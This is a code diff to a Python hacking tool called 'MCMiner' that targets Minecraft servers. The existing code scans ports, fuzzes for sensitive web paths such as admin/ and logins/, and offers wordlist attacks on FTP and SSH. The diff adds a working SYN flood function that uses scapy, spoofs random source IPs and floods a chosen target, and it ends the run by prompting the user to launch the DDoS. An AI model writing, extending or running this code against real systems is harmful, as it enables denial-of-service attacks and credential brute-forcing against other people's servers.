@@ -1,9 +1,13 @@
-import socket
 from colorama import Fore, init
 import requests
-import os
+from sys import stdout
+from scapy.all import *
+from random import randint
 import threading
 import time
+import socket
+
+from scapy.layers.inet import TCP, IP
 
 Fore.LR = Fore.LIGHTRED_EX
 Fore.LG = Fore.LIGHTGREEN_EX
@@ -21,9 +25,9 @@ TARGET_DATA = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register
                'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
                'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
                'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
-TryFTP = False
-TrySSH = False
-ScrapeWeb = False
+FTP = False
+SSH = False
+Website = False
 
 os.system('title MCMiner by wfsec')
 print(f'''
@@ -54,24 +58,74 @@ PORTS = {21: 'FTP',
          25565: 'JavaServer'}
 
 
+def randomIP():
+    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
+    return ip
+
+
+def randInt():
+    x = randint(1000, 9000)
+    return x
+
+
+def SYN_Flood(dstIP, dstPort, counter):
+    total = 0
+    print("             Packets are sending ...")
+
+    for x in range(0, counter):
+        s_port = randInt()
+        s_eq = randInt()
+        window = randInt()
+
+        IP_Packet = IP()
+        IP_Packet.src = randomIP()
+        IP_Packet.dst = dstIP
+
+        TCP_Packet = TCP()
+        TCP_Packet.sport = s_port
+        TCP_Packet.dport = dstPort
+        TCP_Packet.flags = "S"
+        TCP_Packet.seq = s_eq
+        TCP_Packet.window = window
+
+        send(IP_Packet / TCP_Packet, verbose=0)
+        print(f'             [{total}] Sent packet')
+        total += 1
+
+    stdout.write("\n             Total packets sent: %i\n" % total)
+
+
+def info():
+    dstIP = input("\n             Target IP : ")
+    dstPort = input("             Target Port : ")
+
+    return dstIP, int(dstPort)
+
+
+def ddos():
+    dstIP, dstPort = info()
+    counter = input("             How many packets do you want to send : ")
+    SYN_Flood(dstIP, dstPort, int(counter))
+
+
 for port in PORTS:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(2)  # Terminate connection if no response after 3 seconds
+    s.settimeout(1)  # Terminate connection if no response after 3 seconds
     result = s.connect_ex((ip, port))
 
     if result == 0:
         if port == 21:
-            TryFTP = True
+            FTP = True
         if port == 22:
-            TrySSH = True
+            SSH = True
         if port == 80:
-            ScrapeWeb = True
+            Website = True
         print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
         s.close()
     else:
-        print(f'{Fore.LR}       [-]{Fore.W} Port {port} is closed on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
+        print(
+            f'{Fore.LR}       [-]{Fore.W} Port {port} is closed on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
         s.close()
-
 
 resp = requests.get(f'https://api.mcsrvstat.us/2/{ip}')  # Query the server status API
 print('')
@@ -108,7 +162,7 @@ def fuzz(directory):
         meaning = '[Too Many Requests]'
         color = Fore.LIGHTYELLOW_EX
     else:
-        meaning = '[Unknown]'
+        meaning = ''
         color = Fore.LIGHTBLUE_EX
     print(f'            {color}[{status}] {meaning} {Fore.W} {fuzz_url}')
 
@@ -120,7 +174,7 @@ def threads_handler():
         fuzz_thread.start()
 
 
-if ScrapeWeb:
+if Website:
     WebASK = input('            Do you want to information about website? y/n: ')
     if WebASK == 'y':
         user_agent = {
@@ -142,7 +196,7 @@ if ScrapeWeb:
         else:
             print('               Ok.')
 
-if TryFTP:
+if FTP:
     print('')
     FTPASK = input('            Do you want to Wordlist attack on FTP? y/n: ')
     if FTPASK == 'y':
@@ -155,7 +209,7 @@ if TryFTP:
         print('''               Ok.
                     ''')
 
-if TrySSH:
+if SSH:
     print('')
     SSHASK = input('             Do you want to Wordlist attack on SSH? y/n: ')
     if SSHASK == 'y':
@@ -167,3 +221,10 @@ if TrySSH:
     else:
         print('''               Ok.
                     ''')
+
+
+ddos_ask = input('            Do you want to try DDoSing? y/n: ')
+if ddos_ask == 'y':
+    ddos()
+else:
+    print('               Ok.')
